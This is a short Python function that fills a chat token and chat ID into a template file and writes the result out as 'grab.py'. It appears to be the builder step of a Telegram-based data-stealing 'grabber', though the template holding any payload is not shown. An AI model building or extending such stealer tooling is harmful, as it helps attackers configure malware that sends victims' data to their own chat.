def generate(chat_token, chat_id):
    with open('src/template.py', 'r') as template_file:
        template_content = template_file.read()

    grab_content = template_content.replace("y=''", f"y='{chat_token}'")
    grab_content = grab_content.replace("z=''", f"z='{chat_id}'")

    with open('grab.py', 'w') as grab_file:
        grab_file.write(grab_content)
